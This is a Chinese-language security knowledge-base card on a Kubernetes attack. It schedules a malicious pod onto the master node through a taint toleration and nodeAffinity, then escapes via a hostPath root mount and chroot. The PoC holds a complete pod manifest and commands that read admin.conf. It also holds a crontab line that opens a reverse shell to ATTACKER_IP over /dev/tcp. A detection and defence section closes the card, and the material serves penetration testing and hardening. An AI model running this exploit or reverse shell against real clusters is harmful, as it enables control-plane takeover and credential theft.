---
id: cloud-k8s-taint-toleration-nodeaffinity-master-escape
title: K8s 污点容忍 + nodeAffinity 将恶意 Pod 调度到 Master 并逃逸
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-taint-toleration-nodeaffinity-escape
tags:
- k8s
- kubernetes
- taint
- toleration
- nodeaffinity
- master
- container-escape
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:40+08:00'
  notes: 已对照原文与图片57/58核对：master有node-role.kubernetes.io/master:NoSchedule污点；仅toleration的Pod被调度到node1，增加requiredDuringScheduling的nodeAffinity后才“成功归属master”（该成功图为正文内嵌图，本地img目录无对应文件，按原文陈述）。卡内toleration+affinity+hostPath:/+chroot步骤与原文一致，并注明1.24+ control-plane标签差异。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
url: /docs/cloud/k8s/cloud-k8s-taint-toleration-nodeaffinity-master-escape/
draft: false
kb_aliases:
- K8s 污点横移
- toleration nodeAffinity
- Master 节点调度
- node-role.kubernetes.io/master
- hostPath Pod 逃逸
---

## 一句话结论

在已获得创建 Pod 权限的前提下，给恶意 Pod 加上对 Master 节点 `node-role.kubernetes.io/master:NoSchedule` 的 toleration，并用 nodeAffinity 强制绑定 Master 标签，就能把 Pod 调度到 Master 节点；Pod 再通过 `hostPath: /` 挂载宿主机根目录并 `chroot`，获取控制平面节点 root，进而接触 etcd/kube-apiserver 配置与凭证。

## 原理

- Master 节点通常带 `node-role.kubernetes.io/master:NoSchedule`（1.24 后为 `control-plane`）污点，普通 Pod 不会被调度上去。
- Pod 的 `tolerations` 只是“不被污点排斥”，并不保证一定调度到该节点；调度器仍会在符合条件（包括 Worker）的节点中选择。
- 必须再加 `affinity.nodeAffinity.requiredDuringSchedulingIgnoredDuringExecution` 匹配 Master 标签（`node-role.kubernetes.io/master` 或 `control-plane`），才能强制只调度到 Master。
- Pod 同时挂载 `hostPath: /` 到 `/test`，进入后 `chroot /test` 或写 `/test/var/spool/cron/root`，即可在 Master 节点执行命令。
- 控制平面节点通常存放 `/etc/kubernetes/`（kubeconfig、证书、etcd 数据）、静态 Pod manifest 等，获取后可能进一步接管整个集群。
- 前提是攻击者已有创建 Pod 的权限（API Server 未授权、Dashboard、kubeconfig、CI 等）；污点本身不是漏洞，是调度策略绕过。

## 触发条件

- 攻击者已获得可在目标命名空间创建 Pod 的权限。
- Master 节点带 NoSchedule 污点，且 Pod 可设置 toleration。
- 集群未启用 PodSecurity/准入控制禁止 hostPath、privileged 或 Master 调度。
- Master 节点标签可被 nodeAffinity 匹配（默认存在 `node-role.kubernetes.io/master` 或 `control-plane`）。

## 利用步骤

1. 查看节点污点：`kubectl describe nodes | grep -A5 Taints`，确认 Master 污点键/效果。
2. 查看 Master 标签：`kubectl get node <master> --show-labels`，确认 `node-role.kubernetes.io/master=true` 或 `control-plane`。
3. 创建 Pod：同时设置 toleration（key/effect 匹配）与 nodeAffinity（requiredDuringScheduling，匹配 Master 标签），并挂载 `hostPath: /`。
4. 查看调度结果：`kubectl get pod -o wide`，确认 NODE 为 Master；若仍在 Worker，检查 affinity 键/值。
5. 进入 Pod：`kubectl exec -it <pod> -- bash`，`chroot /test /bin/bash` 或读 `/test/etc/kubernetes/`。
6. 写 Master crontab 反弹 shell，或直接读取 kubeconfig/证书/etcd 数据。
7. 清理 Pod 与定时任务；授权测试后恢复。

## PoC

完整 YAML：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: master-taints
spec:
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: node-role.kubernetes.io/master
            operator: Exists
  tolerations:
  - key: node-role.kubernetes.io/master
    operator: Exists
    effect: NoSchedule
  containers:
  - name: master-taints
    image: ubuntu:18.04
    command: ["/bin/sleep", "3650d"]
    volumeMounts:
    - name: host
      mountPath: /test
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

创建与验证：

```bash
kubectl apply -f taints.yaml
kubectl get pod master-taints -o wide   # NODE 应为 master
kubectl exec -it master-taints -- bash
chroot /test /bin/bash
cat /etc/kubernetes/admin.conf
```

写入 Master crontab：

```bash
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/7878 0>&1' >> /test/var/spool/cron/root
```

## 变体与关联

- 变体：1.24+ 使用 `node-role.kubernetes.io/control-plane` 污点/标签；同时兼容两个键更稳。
- 变体：只有 toleration 没有 affinity 时，Pod 可能被调度到 Worker（文章现象）；必须加 nodeAffinity。
- 变体：Master 有 `NoExecute` 污点时，toleration 的 effect 要匹配；否则 Pod 会被驱逐。
- 变体：不挂 hostPath 时，仍可通过 Master 上的 ServiceAccount/网络位置访问 etcd/API Server。
- 关联：[[cloud-container-k8s-workload-config-escape]]（hostPath/privileged 逃逸）。
- 关联：[[cloud-k8s-k8s-apiserver-anonymous-access]]、[[cloud-k8s-dashboard-skip-login-cluster-admin-takeover]]、[[cloud-k8s-kubeconfig-leak-cluster-takeover]]（获取创建 Pod 权限的前置入口）。
- 注意：控制平面节点被攻陷影响整个集群；测试时避免修改 etcd/静态 Pod。

## 检测与防御

- 防御：对 Master 节点使用更严格的准入控制（PodSecurityPolicy/PSA），禁止普通用户在该节点创建 Pod；使用 `nodeSelector`/taint 与 RBAC 限制。
- 防御：限制 `create pods` 权限到必要命名空间/用户；禁止 hostPath `/`、privileged、hostPID/hostNetwork。
- 防御：Master 节点标签/污点与准入策略结合；对控制平面节点启用独立审计与告警。
- 检测：Pod 的 toleration 匹配 Master 污点且 nodeAffinity 指向 Master；Pod 被调度到控制平面节点；Pod 挂载 `hostPath: /`；Master 节点出现异常 Pod/crontab/进程；`/etc/kubernetes` 被读取。
- 响应：删除恶意 Pod、回滚调度/准入配置、检查 Master 节点文件与凭据、轮换集群证书/Token、审计 API 日志。
